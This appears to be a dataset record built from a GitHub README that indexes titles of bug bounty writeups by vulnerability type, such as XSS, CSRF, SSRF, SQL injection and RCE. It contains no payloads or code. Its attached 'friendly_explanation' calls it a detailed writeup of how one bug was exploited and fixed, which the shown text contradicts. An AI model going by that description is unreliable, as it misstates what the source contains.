learndigital.withgoogle.com CSRF token bypass [a tale of 2k bug] 2FA bypass via CSRF attack Stored iframe injection CSRF account takeover Instagram delete media CSRF An inconsistent CSRF Bypass CSRF with clickjacking worth 1250 Sitewide CSRF graphql Account takeover using CSRF json based CORS to CSRF attack My first CSRF to account takeover 4x chained CSRFs chained for account takeover CSRF can lead to stored XSS Yet other examples of abusing CSRF in logout Wordpress CSRF to RCE Bruteforce user IDs via CSRF to delete all the users with CSRF attack CSRF Bypass using cross frame scripting Account takeover via CSRF A very useful technique to bypass the CSRF protection CSRF account takeover exlpained automated manual bugbounty CSRF to account takeover How I got 500USD from microsoft for CSRF vulnerability Critical Bypass CSRF protection RXSS CSRF bypass to full account takeover Youtube CSRF Self XSS + CSRF = Stored XSS Ribose IDOR with simple CSRF bypass unrestrcited changes and deletion to other photo profile JSON CSRF attack on a social networking site Hacking facebook oculus integration CSRF Amazon leaking CSRF token using service worker Facebook graphql CSRF Chain the vulnerabilities and take your report impact on the moon csrf to html injection Partial CSRF to Full CSRF Stealing access token of one drive integration by chain csrf vulnerability Metasploit web project kill all running taks CSRF CVE-2017-5244 Messenger site wide CSRF Hacking Facebook CSRF device login flow Two vulnerabilities makes an exploit XSS and CSRF in bing How I bypassed Facebook in 2016 Ubiquiti bugbounty unifi generic CSRF protection Bypass Bypass Facebook CSRF Facebook CSRF full account takeover Clickjacking (UI redressing attack) Google Bug bounty Clickjacking on Google payment Google APIs Clickjacking worth 1337$ Clickjacking + XSS on Google org Bypass CSRF with clickjacking on Google org 1800 worth Clickjacking Account takeover with clickjacking Clickjacking on google CSE How I accidentally found clickjacking in Facebook Clickjacking on google myaccount worth 7500 Clickjacking in google docs and void typing feature Reflected DOM XSS and Clickjacking binary.com clickjacking vulnerability exploiting HTML5 security features 12000 intersection betwen clickjacking XSS and denial of service Steam fire and paste : a story of uxss via DOM XSS and Clickjacking in steam inventory helper Yet another Google Clickjacking Redressing instagram leaking application tokens via instagram clickjacking vulnerability Self XSS to Good XSS and Clickjacking Microsoft Yammer clickjacking exploiting HTML5 security features Firefox find my device clickjacking Whatsapp Clickjacking vulnerability Telegram WEB client clickjacking vulnerability Facebook Clickjacking : how we put a new dress on facebook UI Local File Inclusion (LFI) RFI LFI Writeup My first LFI Bug bounty LFI at Google.com Google LFI on production servers in redacted.google.com LFI to 10 server pwn LFI in apigee portals Chain the bugs to pwn an organisation LFI unrestricted file upload to RCE How we got LFI in apache drill recom like a boss Bugbounty journey from LFI to RCE LFI to RCE on deutche telekom bugbounty From LFI to RCE via PHP sessions magix bugbounty magix.com XSS RCE SQLI and LFI LFI in nokia maps Subdomain Takeover How I bought my way to subdomain takeover on tokopedia Subdomain Takeover via pantheon Subdomain takeover : a unique way Escalating subdomain takeover to steal sensitive stuff Subdomain takeover awarded 200 Subdomain takeover via wufoo service Subdomain takeover via Hubspot Souq.com subdomain takeover Subdomain takeover : new level Subdomain takeover due to misconfigured project settings for custom domain Subdomain takeover via shopify vendor Subdomain takeover via unsecured s3 bucket Subdomain takeover worth 200 Subdomain takeover via campaignmonitor How to do 55000 subdomain takeover in a blink of an eye Subdomain takeover Starbucks (Part 2) Subdomain takeover Starbucks Uber wildcard subdomain takeover Bugcrowd domain subdomain takeover vulnerability Subdomain takeover vulnerability (Lamborghini Hacked) Authentication bypass on uber's SSO via subdomain takeover Authentication bypass on SSO ubnt.com via Subdomain takeover of ping.ubnt.com Denial of Service (DOS) Long String DOS AIRDOS Denial of Service DOS vulnerability in script loader (CVE-2018-6389) Github actions DOS Application level denial of service Banner grabbing to DOS and memory corruption DOS across Facebook endpoints DOS on WAF protected sites DOS on Facebook android app using zero width no break characters Whatsapp DOS vulnerability on android and iOS Whatsapp DOS vulnerability in iOS android Authentication Bypass Touch ID authentication Bypass on evernote and dropbox iOS apps Oauth authentication bypass on airbnb acquistion using wierd 1 char open redirect Two factor authentication bypass Instagram multi factor authentication bypass Authentication bypass in nodejs application Symantec authentication Bypass Authentication bypass in CISCO meraki Slack SAML authentocation bypass Authentication bypass on UBER's SSO Authentication Bypass on airbnb via oauth tokens theft Inspect element leads to stripe account lockout authentication Bypass Authentication bypass on SSO ubnt.com SQL Injection(SQLI) Tricky oracle SQLI situation Exploiting “Google BigQuery” SQLI SQLI via stopping the redirection to a login page Finding SQLI with white box analysis a recent bug example Bypassing a crappy WAF to exploit a blind SQLI SQL Injection in private-site.com/login.php Exploiting tricky blind SQLI SQLI in forget password fucntion SQLI Bug Bounty File Upload blind SQLI SQL Injection SQLI through User Agent SQLI in insert update query without comma SQLI for 50 bounty Abusing MYSQL CLients SQLI Authentication Bypass AutoTrader Webmail ZOL Zimbabwe Authentication Bypass to XSS & SQLi SQLI bootcamp.nutanix.com SQLI in University of Cambridge Making a blind SQLI a little less Blind SQLI SQLI amd silly WAF Attacking Postgresql Database Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection A 5 minute SQLI Union based SQLI writeup SQLI with load file and into outfile SQLI is Everywhere SQLI in Update Query Bug Blind SQLI Hootsuite Yahoo – Root Access SQLI – tw.yahoo.com Step by Step Exploiting SQLI in Oculus Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) Tesla Motors blind SQLI SQLI in Nokia Sites Insecure Direct Object Reference (IDOR) Disclose Private Dashboard Chart's name and data in Facebook Analytics Disclosing privately shared gaming clips of any user Adding anyone including non-friend and blocked people as co-host in personal event! Page analyst could view job application details Deleting Anyone's Video Poll 2FA related issues 2FA Bypass via logical rate limiting Bypass Bypass 2FA in a website Weird and simple 2FA bypass How I cracked 2FA with simple factor bruteforce Instagram account is reactivated without entering 2FA How to bypass 2FA with a HTTP header How I hacked 40k user accounts of microsoft using 2FA bypass outlook How I abused 2FA to maintain persistence after password recovery change google microsoft instragram Bypass hackerone 2FA Facebook Bug bounty : How I was able to enumerate instagram accounts who had enabled 2FA CORS related issues CORS bug on google's 404 page (rewarded) CORS misconfiguration leading to private information disclosure CORS misconfiguration account takeover out of scope to grab items in scope Chrome CORS Bypassing CORS CORS to CSRF attack An unexploited CORS misconfiguration reflecting further issues Think outside the scope advanced cors exploitation techniques A simple CORS misconfiguration leaked private post of twitter facebook instagram Explpoiting CORS misconfiguration Full account takeover through CORS with connection sockets Exploiting insecure CORS API api.artsy.net Pre domain wildcard CORS exploitation Exploiting misconfigured CORS on popular BTC site Abusing CORS for an XSS on flickr Server Side Request Forgery (SSRF) Exploiting an SSRF trials and tribulations SSRF on PDF generator Google VRP SSRF in Google cloud platform stackdriver Vimeo upload function SSRF SSRF via ffmeg processing My first SSRF using DNS rebinding Bugbounty simple SSRF SSRF reading local files from downnotifier server SSRF vulnerability Gain adfly SMTP access with SSRF via gopher protocol Blind SSRF in stripe.com due to senntry misconfiguration SSRF port issue hidden approch The jorney of web cache firewall bypass to SSRF to AWS credentials compromise SSRF to local file read and abusing aws metadata pdfreactor SSRF to root level local files read which lead to RCE SSRF trick : SSRF XSPA in micosoft's bing webwaster Downnotifeer SSRF Escalating SSRF to RCE Vimeo SSRF with code execution potential SSRF in slack Exploiting SSRF like a boss AWS takeover SSRF javascript Into the borg of SSRF inside google production network SSRF to local file disclosure How I found an SSRF in yahoo guesthouse (recon wins) Reading internal files using SSRF vulnerability Airbnb chaining third party open redirect into SSRF via liveperson chat Race Condition Exploiting a Race condition vulnerabililty Race condition that could result to RCE a story with an app Creating thinking is our everything : Race condition and business logic Chaining improper authorization to Race condition to harvest credit card details A Race condition bug in Facebook chat groups Race condition bypassing team limit Race condition on web Race condition bugs on Facebook Hacking Banks With Race Conditions Race Condition Bug In Web App: A Use Case RACE Condition vulnerability found in bug-bounty program How to check Race Conditions in Web Applications Remote Code Execution (RCE) Microsoft RCE bugbounty OTP bruteforce account takeover Attacking helpdesk RCE chain on deskpro with bitdefender Remote image upload leads to RCE inject malicious code Finding a p1 in one minute with shodan.io RCE From recon to optimizing RCE results simple story with one of the biggest ICT company Uploading backdoor for fun and profit RCE DB creds P1 Responsible Disclosure breaking out of a sandboxed editor to perform RCE Wordpress design flaw leads to woocommerce RCE Path traversal while uploading results in RCE RCE jenkins instance Traversing the path to RCE How I chained 4 bugs features into RCE on amazon RCE due to showexceptions Yahoo luminate RCE Latex to RCE private bug bounty program How I got hall of fame in two fortune 500 companies an RCE story RCE by uploading a web config 36k Google app engine RCE How I found 2.9 RCE at yahoo Bypass firewall to get RCE RCE vulnerabilite in yahoo subdomain RCE in duolingos tinycards app from android Unrestricted file upload to RCE Getting a RCE (CTF WAY) RCE starwars How I got 5500 from yahoo for RCE RCE in Addthis Paypal RCE My First RCE (Stressed Employee gets me 2x bounty) Abusing ImageMagick to obtain RCE How Snapdeal Kept their Users Data at Risk! RCE via ImageTragick How I Cracked 2FA with Simple Factor Brute-force! Found RCE but got Duplicated “Recon” helped Samsung protect their production repositories of SamsungTv, eCommerce eStores IDOR to RCE RCE on AEM instance without JAVA knowledge RCE with Flask Jinja tempelate Injection Race Condition that could result to RCE Chaining Two 0-Days to Compromise An Uber Wordpress Oculus Identity Verification bypass through Brute Force Used RCE as Root on marathon Instance Two easy RCE in Atlassian Products RCE in Ruby using mustache templates About a Sucuri RCE…and How Not to Handle Bug Bounty Reports Source code disclosure vulnerability Bypassing custom Token Authentication in a Mobile App Facebook’s Burglary Shopping List From SSRF To RCE in PDFReacter Apache strust RCE Dell KACE K1000 Remote Code Execution Handlebars Tempelate Injection and RCE Leaked Salesforce API access token at IKEA.com Zero Day RCE on Mozilla's AWS Network Escalating SSRF to RCE Fixed : Brute-force Instagram account’s passwords Bug Bounty 101 — Always Check The Source Code ASUS RCE vulnerability on rma.asus-europe.eu Magento – RCE & Local File Read with low privilege admin rights RCE in Nokia.com Two RCE in SharePoint Token Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over RCE in Hubspot with EL injection in HubL Github Desktop RCE eBay Source Code leak Facebook source code disclosure in ads API XS-Searching Google’s bug tracker to find out vulnerable source code Buffer Overflow Writeups Buffer Overflow Attack Book pdf Github Repository on Buffer Overflow Attack Stack-Based Buffer Overflow Attacks: Explained and Examples How Buffer Overflow Attacks Work Binary Exploitation: Buffer Overflows WHAT IS A BUFFER OVERFLOW? LEARN ABOUT BUFFER OVERRUN VULNERABILITIES, EXPLOITS & ATTACKS Android Pentesting Android Pentesting Lab (Step by Step guide for beginners!) Contributing Open Pull Requests Send me links of writeups to My Twitter : 0xAsm0d3us Maintainers This Repo is maintained by : devanshbatham e13v3n-0xb About A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Topics bugbounty bughunting bugbountytips bugbounty-writeups security-writeups bugbounty-blogs bugbounty-yahoo bugbounty-facebook bughunting-methodology bughunting-writeups Resources Readme Uh oh! There was an error while loading. Please reload this page . Activity Stars 5.3k stars Watchers 248 watching Forks 1.1k forks Report repository Releases No releases published Packages 0 No packages published Uh oh! There was an error while loading. Please reload this page . Contributors 8 Languages Python 100.0% Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
{"source_url": "https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#android-pentesting", "title": "GitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference", "friendly_explanation": "This is a bug bounty writeup from https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#android-pentesting. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert devanshbatham / Awesome-Bugbounty-Writeups Public Notifications You must be signed in to change notification settings Fork 1.1k Star 5.3k A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference 5.3k stars 1.1k forks Branches Tags Activity Star Notifications You must be signed in to change notification settings Code Issues 8 Pull requests 2 Actions Projects 0 Security Uh oh! There was an error while loading. Please reload this page . Insights Additional navigation options Code Issues Pull requests Actions Projects Security Insights devanshbatham/Awesome-Bugbounty-Writeups master Branches Tags Go to file Code Open more actions menu Folders and files Name Name Last commit message Last commit date Latest commit History 59 Commits static static README.md README.md View all files Repository files navigation README Contents Cross Site Scripting (XSS) Cross Site Request Forgery (CSRF) Clickjacking (UI Redressing Attack) Local File Inclusion (LFI) Subdomain Takeover Denial of Service (DOS) Authentication Bypass SQL injection Insecure Direct Object Reference (IDOR) 2FA Related issues CORS Related issues Server Side Request Forgery (SSRF) Race Condition Remote Code Execution (RCE) Android Pentesting Contributing Maintainers Cross Site Scripting (XSS) From P5 to P2 to 100 BXSS Google Acquisition XSS (Apigee) XSS on Microsoft.com via Angular Js template injection Researching Polymorphic Images for XSS on Google Scholar Netflix Party Simple XSS Stored XSS in google nest Self XSS to persistent XSS on login portal Universal XSS affecting Firefox XSS WAF Character limitation bypass like a boss Self XSS to Account Takeover Reflected XSS on Microsoft subdomains The tricky XSS Reflected XSS in AT&T XSS on Google using Acunetix Exploiting websocket application wide XSS Reflected XSS with HTTP Smuggling XSS on Facebook instagram CDN server bypassing signature protection XSS on Facebook's Acquisition Oculus XSS on sony Subdomain Exploiting Self XSS Effortlessly Finding Cross Site Scripting inclusion XSSI Bugbounty a DOM XSS Blind XSS : a mind Game FireFox IOS QR code reader XSS(CVE-2019-17003) HTML injection to XSS CVE-2020-13487 | Authenticated Stored Cross-site Scripting in bbPress XSS at error page of repository code XSS like a Pro How I turned self XSS to stored XSS via CSRF XSS Stored on Outlook web XSS Bug 20 Chars Blind XSS Payload XSS in AMP4EMAIL(DOM clobbering) DOM Based XSS bug bounty writeup XSS will never die 5000 USD XSS issue at avast desktop antivirus XSS to account takeover How Paypal helped me to generate XSS Bypass Uppercase filters like a PRO(XSS advanced methods) Stealing login credentials with reflected XSS bughunting xss on cookie popup warning XSS is love Oneplus XSS vulnerability in customer support portal Exploiting cookie based XSS by finding RCE Stored XSS on zendesk via macros XSS in ZOHO main DOM based XSS in private program Bugbounty writeup : Take Attention and get stored XSSS How I xssed admin account Clickjacking XSS on google Stored XSS on laporbugid Leveraging angularjs based XSS to privilege escalation How I found XSS by searching in shodan Chaining caache poisining to stored XSS XSS to RCE XSS on twitter worth 1120 Reflected XSS in ebay.com Cookie based XSS exolpoitation 2300 bug bounty What do netcat -SMTP-self XSS have in common XSS on google custom search engine Story of a Full Account Takeover vulnerability N/A to Accepted Yeah I got p2 in 1 minute stored XSS via markdown editor Stored XSS on indeed Self XSS to evil XSS How a classical XSS can lead to persistent ATO vulnerability Reflected XSS in tokopedia train ticket Bypassing XSS filter and stealing user credit card data Googleplex.com blind XSS Reflected XSS on error page How I was able to get private ticket response panel and fortigate web panel via blind XSS Unicode vs WAF Story of URI based XSS with some simple google dorking Stored XSS on edmodo XSSed my way to 1000 Try harder for XSS From parameter pollution to XSS MIME sniffing XSS Stored XSS on techprofile Microsoft Tale of a wormable Twitter XSS XSS attacks google bot index manipulation From Reflected XSS to Account takeover Stealing local storage data through XSS CSRF attack can lead to stored XSS XSS Reflected (filter bypass) XSS protection bypass on hackerone private program Just 5 minutes to get my 2nd Stored XSS on edmodo.com Multiple XSS in skype.com Obtaining XSS using moodle featured and minor bugs XSS on 403 forbidden bypass akamai WAF How I was turn self XSS into reflected XSS A Tale of 3 XSS Stored XSS on Google.com Stored XSS in the Guides gameplaersion (www.dota2.com) Admin google.com reflected XSS Paypal Stored security bypass Paypal DOM XSS main domain Bugbounty : The 5k$ Google XSS Facebook stored XSS Ebay mobile reflected XSS Magix bugbounty XSS writeup Abusing CORS for an XSS on flickr XSS on google groups Oracle XSS Content types and XSS Facebook Studio Admob Creative image XSS Amazon Packaging feedback XSS PaypalTech XSS Persistent XSS on my world Google VRP XSS in device management Google VRP XSS Google VRP Blind XSS WAZE XSS Referer Based XSS How we invented the Tesla DOM XSS Stored XSS on rockstar game How I was able to bypass strong XSS protection in well known website imgur.com Self XSS to Good XSS That escalated quickly : from partial CSRF to reflected XSS to complete CSRF to Stored XSS XSS using dynamically generated js file Bypassing XSS filtering at anchor Tags XSS by tossing cookies Coinbase angularjs dom XSS via kiteworks Medium Content spoofing and XSS Managed Apps and music a tale of two XSSes in Google play Making an XSS triggered by CSP bypass on twitter Escalating XSS in phantomjs image rendering to SSRF Reflected XSS in Simplerisk Stored XSS in the heart of the russian email provider How I built an XSS worm on atmail XSS on bugcrowd and so many other websites main domain Godaddy XSS affects parked domains redirector Processor Stored XSS in Google image search A pair of plotly bugs stored XSS abd AWS metadata Near universal XSS in mcafee web gateway Penetrating Pornhub XSS vulns How I found a 5000 Google maps XSS by fiddling with protobuf Airbnb when bypassing json encoding XSS filter WAF CSP and auditior turns into eight vulnerabilities Lightwight markup a trio of persistent XSS in gitlab XSS ONE BAY SVG XSS in unifi Stored XSS in unifi V4.8.12 controller Turning self XSS into good XSS v2 SWF XSS DOM Based XSS XSS filter bypass in Yahoo Dev flurry XSS on Flickr Two vulnerabilities makes an exploit XSS and csrf in bing Runkeeper stored XSS Google sleeping XSS awakens 5k bounty Poisoning the well compromising godaddy customer support with blind XSS UBER turning self XSS to good XSS XSS on facebook via png content types Cloudflare XSS How I found XSS Vulnerability in Google XSS to RCE One payload to XSS them all Self XSS on komunitas Reclected XSS on alibabacloud Self XSS on komunitas bukalapak A real XSS in OLX Self XSS using IE adobes Stealing local storage through XSS 1000 USD in 5mins Stored XSS in Outlook OLX reflected XSS My first stored XSS on edmodo.com Hack your form new vector for BXSS How I found Blind XSS vulnerability in redacted.com 3 XSS in protonmail for iOS XSS in edmodo wihinin 5 mins Stil work redirect Yahoo subdomain XSS XSS in azure devOps Shopify reflected XSS Muliple Stored XSS on tokopedia Stored XSS on edmodo A unique XSS scenario 1000 Bounty Protonmail XSS Stored Chaining tricky ouath exploitation to stored XSS Antihack XSS to php uplaod Reflected XSS in zomato XSS through SWF file Hackyourform BXSS Reflected XSS on ASUS Stored XSS via Alternate text at zendesk support How I stumbled upon a stored XSS : my first bug bounty story Cookie based Self XSS to Good XSS Reflected XSS on amazon XSS worm : a creative use of web application vulnerability Google code in XSS Self XSS on indeed.com How I accidentally found XSS in Protonmail for iOS app XML XSS in yandex.ru by accident Critical Stored XSS vulnerability XSS bypass using META tag in realestate.postnl.nl Edmodo XSS bug XSS in hiden input fields How I discovered XSS that affected over 20 uber subdomains DOM based XSS or why you should not rely on cloudflare too much XSS in dynamics 365 XSS deface with html and how to convert the html into charcode Cookie based injection XSS making explitable with exploiting other vulns XSS with put in ghost blog XSS using a Bug in safari and why blacklists are stupid Magic XSS with two parameters DOM XSS bug affecting tinder shopify Yelp Persistent XSS unvalidated open graph embed at linkedin.com My first 0day exploit CSP Bypass Reflected XSS Google Stored XSS in payments XSS on dropbox Weaponizing XSS attacking internal domains How I XSSed UBER and bypassed CSP RXSS and CSRF bypass to Account takeover Another XSS in google collaboratory How I bypassed AKAMAI waf in overstock.com Reflected XSS at philips.com XSS vulnerabilities in multiple iframe busters affecting top tier sites Reflected DOM XSS and clickjacking silvergoldbull Stored XSS vulnerability in h1 private Authbypass SQLi and XSS Stored XSS vulnerability in tumblr XSS in google code jam Mapbox XSS My first valid XSS Stored XSS in webcomponents.org 3 minutes XSS icloud.com DOM based XSS XSS at hubspot and in email areas Self XSS leads to blind XSS and Reflected XSS Refltected XSS primagames.com Stored XSS in gameskinny Blind XSS in Chrome experments Google Yahoo two XSSI vulnerabilities chained to steal user information (750$) How I found XSS on amazon A blind XSS in messengers twins XSS in microsoft Subdomain Persistent XSS at ah.nl The 12000 intersection betwenn clickjaking , XSS and DOS XSS in google collaboratory CSP bypass How I found blind XSS in apple Reflected XSS on amazon.com How I found XSS in 360totalsecurity The 2.5 BTC Stored XSS XSS Vulnerability in Netflix A story of a UXSS via DOM XSS clickjacking in steam inventory helper How I found XSS via SSRF vulnerability Searching for XSS found ldap injection how I converted SSRF to XSS in a SSRF vulnerable JIRA Reflected XSS in Yahoo subdomain Account takeover and blind XSS How I found 5 stored XSS on a private program Persistent XSS to steal passwords(Paypal) Self XSS + CSRF to stored XSS Stored XSS in yahoo and subdomains XSS in microsoft Blind XSS at customer support panel Reflected XSS on stackoverflow Stored XSS in Yahoo XSS 403 forbidden Bypass Turning self XSS into non self XSS via authorization issue at paypal A story of stored XSS bypass Mangobaaz hacked XSS to credentials How I got stored XSS using file upload Bypassing CSP to abusing XSS filter in edge XSS to session Hijacking Reflected XSS on www.zomato.com XSS in subdomain of yahoo XSS in yahoo.net subdomain Reflected XSS moongaloop swf version 62x Google adwords 3133.7 Stored XSS How I found a surprising XSS vulnerability on oracle netsuite Stored XSS on snapchat How I was able to bypass XSS protection on h1 private program Reflected XSS possible XSS via angularjs template injection hostinger Microsoft follow feature XSS (CVE-2017-8514) XSS protection bypass made my quickest bounty ever Taking note XSS to RCE in the simplenote electron client VMWARE official vcdx reflected XSS How I pwned a company using IDOR and Blind XSS From Recon to DOM based XSS Local file read via XSS Non persistent XSS at microsoft A Stored XSS in google (double kill) Filter bypass to Reflected XSS on finance.yahoo.com (mobile version) 900$ XSS in yahoo : recon wins How I bypassed practos firewall and triggered an XSS vulnerability Stored XSS to full information disclosure Story of parameter specific XSS Chaining self XSS with UI redressing leading to session hijacking Stored XSS with arbitrary cookie installation Reflective XSS and Open redirect on indeed.com subdomain How I found reflected XSS on Yahoo subdomain Dont just alert(1) because XSS is more fun UBER XSS by helpe of KNOXSS Reflected XSS in Yahoo Reflected XSS on ww.yahoo.com XSS because of wrong content type header Cross Site Request Forgery (CSRF) How a simple CSRF attack turned into a P1 How I exploited the json csrf with method override technique How I found CSRF(my first bounty) Exploiting websocket application wide XSS and CSRF Site wide CSRF on popular program Using CSRF I got weird account takeover CSRF CSRF CSRF Google Bugbounty CSRF in learndigital.withgoogle.com CSRF token bypass [a tale of 2k bug] 2FA bypass via CSRF attack Stored iframe injection CSRF account takeover Instagram delete media CSRF An inconsistent CSRF Bypass CSRF with clickjacking worth 1250 Sitewide CSRF graphql Account takeover using CSRF json based CORS to CSRF attack My first CSRF to account takeover 4x chained CSRFs chained for account takeover CSRF can lead to stored XSS Yet other examples of abusing CSRF in logout Wordpress CSRF to RCE Bruteforce user IDs via CSRF to delete all the users with CSRF attack CSRF Bypass using cross frame scripting Account takeover via CSRF A very useful technique to bypass the CSRF protection CSRF account takeover exlpained automated manual bugbounty CSRF to account takeover How I got 500USD from microsoft for CSRF vulnerability Critical Bypass CSRF protection RXSS CSRF bypass to full account takeover Youtube CSRF Self XSS + CSRF = Stored XSS Ribose IDOR with simple CSRF bypass unrestrcited changes and deletion to other photo profile JSON CSRF attack on a social networking site Hacking facebook oculus integration CSRF Amazon leaking CSRF token using service worker Facebook graphql CSRF Chain the vulnerabilities and take your report impact on the moon csrf to html injection Partial CSRF to Full CSRF Stealing access token of one drive integration by chain csrf vulnerability Metasploit web project kill all running taks CSRF CVE-2017-5244 Messenger site wide CSRF Hacking Facebook CSRF device login flow Two vulnerabilities makes an exploit XSS and CSRF in bing How I bypassed Facebook in 2016 Ubiquiti bugbounty unifi generic CSRF protection Bypass Bypass Facebook CSRF Facebook CSRF full account takeover Clickjacking (UI redressing attack) Google Bug bounty Clickjacking on Google payment Google APIs Clickjacking worth 1337$ Clickjacking + XSS on Google org Bypass CSRF with clickjacking on Google org 1800 worth Clickjacking Account takeover with clickjacking Clickjacking on google CSE How I accidentally found clickjacking in Facebook Clickjacking on google myaccount worth 7500 Clickjacking in google docs and void typing feature Reflected DOM XSS and Clickjacking binary.com clickjacking vulnerability exploiting HTML5 security features 12000 intersection betwen clickjacking XSS and denial of service Steam fire and paste : a story of uxss via DOM XSS and Clickjacking in steam inventory helper Yet another Google Clickjacking Redressing instagram leaking application tokens via instagram clickjacking vulnerability Self XSS to Good XSS and Clickjacking Microsoft Yammer clickjacking exploiting HTML5 security features Firefox find my device clickjacking Whatsapp Clickjacking vulnerability Telegram WEB client clickjacking vulnerability Facebook Clickjacking : how we put a new dress on facebook UI Local File Inclusion (LFI) RFI LFI Writeup My first LFI Bug bounty LFI at Google.com Google LFI on production servers in redacted.google.com LFI to 10 server pwn LFI in apigee portals Chain the bugs to pwn an organisation LFI unrestricted file upload to RCE How we got LFI in apache drill recom like a boss Bugbounty journey from LFI to RCE LFI to RCE on deutche telekom bugbounty From LFI to RCE via PHP sessions magix bugbounty magix.com XSS RCE SQLI and LFI LFI in nokia maps Subdomain Takeover How I bought my way to subdomain takeover on tokopedia Subdomain Takeover via pantheon Subdomain takeover : a unique way Escalating subdomain takeover to steal sensitive stuff Subdomain takeover awarded 200 Subdomain takeover via wufoo service Subdomain takeover via Hubspot Souq.com subdomain takeover Subdomain takeover : new level Subdomain takeover due to misconfigured project settings for custom domain Subdomain takeover via shopify vendor Subdomain takeover via unsecured s3 bucket Subdomain takeover worth 200 Subdomain takeover via campaignmonitor How to do 55000 subdomain takeover in a blink of an eye Subdomain takeover Starbucks (Part 2) Subdomain takeover Starbucks Uber wildcard subdomain takeover Bugcrowd domain subdomain takeover vulnerability Subdomain takeover vulnerability (Lamborghini Hacked) Authentication bypass on uber's SSO via subdomain takeover Authentication bypass on SSO ubnt.com via Subdomain takeover of ping.ubnt.com Denial of Service (DOS) Long String DOS AIRDOS Denial of Service DOS vulnerability in script loader (CVE-2018-6389) Github actions DOS Application level denial of service Banner grabbing to DOS and memory corruption DOS across Facebook endpoints DOS on WAF protected sites DOS on Facebook android app using zero width no break characters Whatsapp DOS vulnerability on android and iOS Whatsapp DOS vulnerability in iOS android Authentication Bypass Touch ID authentication Bypass on evernote and dropbox iOS apps Oauth authentication bypass on airbnb acquistion using wierd 1 char open redirect Two factor authentication bypass Instagram multi factor authentication bypass Authentication bypass in nodejs application Symantec authentication Bypass Authentication bypass in CISCO meraki Slack SAML authentocation bypass Authentication bypass on UBER's SSO Authentication Bypass on airbnb via oauth tokens theft Inspect element leads to stripe account lockout authentication Bypass Authentication bypass on SSO ubnt.com SQL Injection(SQLI) Tricky oracle SQLI situation Exploiting “Google BigQuery” SQLI SQLI via stopping the redirection to a login page Finding SQLI with white box analysis a recent bug example Bypassing a crappy WAF to exploit a blind SQLI SQL Injection in private-site.com/login.php Exploiting tricky blind SQLI SQLI in forget password fucntion SQLI Bug Bounty File Upload blind SQLI SQL Injection SQLI through User Agent SQLI in insert update query without comma SQLI for 50 bounty Abusing MYSQL CLients SQLI Authentication Bypass AutoTrader Webmail ZOL Zimbabwe Authentication Bypass to XSS & SQLi SQLI bootcamp.nutanix.com SQLI in University of Cambridge Making a blind SQLI a little less Blind SQLI SQLI amd silly WAF Attacking Postgresql Database Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection A 5 minute SQLI Union based SQLI writeup SQLI with load file and into outfile SQLI is Everywhere SQLI in Update Query Bug Blind SQLI Hootsuite Yahoo – Root Access SQLI – tw.yahoo.com Step by Step Exploiting SQLI in Oculus Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) Tesla Motors blind SQLI SQLI in Nokia Sites Insecure Direct Object Reference (IDOR) Disclose Private Dashboard Chart's name and data in Facebook Analytics Disclosing privately shared gaming clips of any user Adding anyone including non-friend and blocked people as co-host in personal event! Page analyst could view job application details Deleting Anyone's Video Poll 2FA related issues 2FA Bypass via logical rate limiting Bypass Bypass 2FA in a website Weird and simple 2FA bypass How I cracked 2FA with simple factor bruteforce Instagram account is reactivated without entering 2FA How to bypass 2FA with a HTTP header How I hacked 40k user accounts of microsoft using 2FA bypass outlook How I abused 2FA to maintain persistence after password recovery change google microsoft instragram Bypass hackerone 2FA Facebook Bug bounty : How I was able to enumerate instagram accounts who had enabled 2FA CORS related issues CORS bug on google's 404 page (rewarded) CORS misconfiguration leading to private information disclosure CORS misconfiguration account takeover out of scope to grab items in scope Chrome CORS Bypassing CORS CORS to CSRF attack An unexploited CORS misconfiguration reflecting further issues Think outside the scope advanced cors exploitation techniques A simple CORS misconfiguration leaked private post of twitter facebook instagram Explpoiting CORS misconfiguration Full account takeover through CORS with connection sockets Exploiting insecure CORS API api.artsy.net Pre domain wildcard CORS exploitation Exploiting misconfigured CORS on popular BTC site Abusing CORS for an XSS on flickr Server Side Request Forgery (SSRF) Exploiting an SSRF trials and tribulations SSRF on PDF generator Google VRP SSRF in Google cloud platform stackdriver 